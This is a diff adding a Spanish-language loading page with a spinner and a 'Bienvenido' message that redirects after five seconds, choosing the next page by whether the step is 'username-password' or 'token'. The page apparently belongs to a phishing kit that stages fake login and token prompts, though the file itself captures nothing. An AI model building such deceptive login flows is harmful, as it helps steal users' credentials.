@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: #0058cb;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+            color: #fff;
+        }
+        .logo {
+            background-image: url(download.svg);
+            width: 51px;
+            height: 67px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            margin: auto;
+        }
+        .spinner {
+            margin: 25px auto 20px;
+            display: flex;
+            justify-content: center;
+        }
+        .spinner div {
+            width: 18px;
+            height: 18px;
+            background-color: #fff;
+            border-radius: 100%;
+            display: inline-block;
+            animation: spinner 1.4s ease-in-out infinite both;
+            margin: 0 3px;
+        }
+        .spinner div:nth-child(1) { animation-delay: -0.32s; }
+        .spinner div:nth-child(2) { animation-delay: -0.16s; }
+        .welcome {
+            font-size: 18px;
+            text-align: center;
+            color: #fff;
+            opacity: 0;
+            animation: welcome1FadeIn 2.5s forwards;
+            animation-delay: 2s;
+        }
+        .subtitle {
+            font-size: 14px;
+            text-align: center;
+            color: #fff;
+            padding: 15px 0;
+            opacity: 0;
+            animation: welcome2FadeIn 2.5s forwards;
+            animation-delay: 2.5s;
+        }
+
+        @keyframes spinner {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+        @keyframes welcome1FadeIn {
+            to { opacity: 1; }
+        }
+        @keyframes welcome2FadeIn {
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo"></div>
+        <div class="spinner">
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <div class="welcome">Bienvenido</div>
+        <div class="subtitle">Favor espera un momento...</div>
+    </div>
+    <script>
+        function redirectToPage() {
+            const params = new URLSearchParams(window.location.search);
+            const action = params.get('action');
+
+            setTimeout(() => {
+                if (action === 'username-password') {
+                    window.location.href = 'index3.html';
+                } else if (action === 'token') {
+                    window.location.href = 'index4.html';
+                } else {
+                    window.location.href = 'index3.html';
+                }
+            }, 5000);
+        }
+
+        window.onload = redirectToPage;
+    </script>
+</body>
+</html>
